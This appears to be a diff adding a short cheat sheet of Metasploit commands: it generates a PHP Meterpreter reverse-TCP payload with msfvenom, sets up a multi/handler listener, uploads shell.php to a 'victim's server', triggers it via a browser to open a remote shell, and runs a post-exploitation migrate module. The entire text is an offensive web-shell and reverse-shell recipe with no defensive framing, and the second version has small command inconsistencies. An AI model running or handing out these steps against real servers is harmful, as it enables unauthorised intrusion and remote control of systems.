@@ -1,0 +1,36 @@
+Generate malicious PHP file:
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<$LOCAL_IP> LPORT=<$LOCAL_PORT> -f raw -o shell.php
+Run msfconsole to start the listener:
+use exploit/multi/handler 
+set LHOST <$LOCAL_IP>
+set LPORT <$LOCAL_PORT>
+set PAYLOAD php/meterpreter/reverse_tcp 
+exploit
+Upload shell.php to the victim’s server and then query it in a browser. This will connect back to the local Metasploit listener and open up a shell on the server.
+
+
+====2======
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+
+msfconsole
+use exploit/multi/handler
+
+set payload php/meterpreter/reverse_tcp
+
+show options
+
+set lhost
+
+set lport <port no.>
+
+run -j
+
+
+upload shell.php
+
+
+http://<ip>/shell.php
+
+shell
+
+run post/windows/manage/migrate
